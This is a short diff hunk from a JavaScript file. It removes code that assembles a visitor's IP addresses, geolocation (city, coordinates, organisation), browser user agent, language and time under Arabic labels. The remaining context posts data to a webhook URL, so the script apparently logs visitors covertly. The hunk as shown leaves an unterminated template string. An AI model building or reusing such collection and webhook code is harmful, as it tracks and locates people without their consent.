@@ -259,20 +259,6 @@
         String(now.getSeconds()).padStart(2, '0');
 
       const infoText = `
-الاسم: ${name}
-IP (IPv4): ${ipv4Data.ip}
-IP (IPv6): ${ipv6Data.ip || 'غير معروف'}
-الدولة: ${geoData.country_name}
-المنطقة: ${geoData.region}
-المدينة: ${geoData.city}
-خط العرض: ${geoData.latitude}
-خط الطول: ${geoData.longitude}
-المنظمة: ${geoData.org}
-المنطقة الزمنية: ${geoData.timezone}
-متصفح المستخدم: ${ua}
-اللغة: ${lang}
-الوقت: ${timeString}
-      `.trim();
 
       fetch(WEBHOOK_URL, {
         method: 'POST',
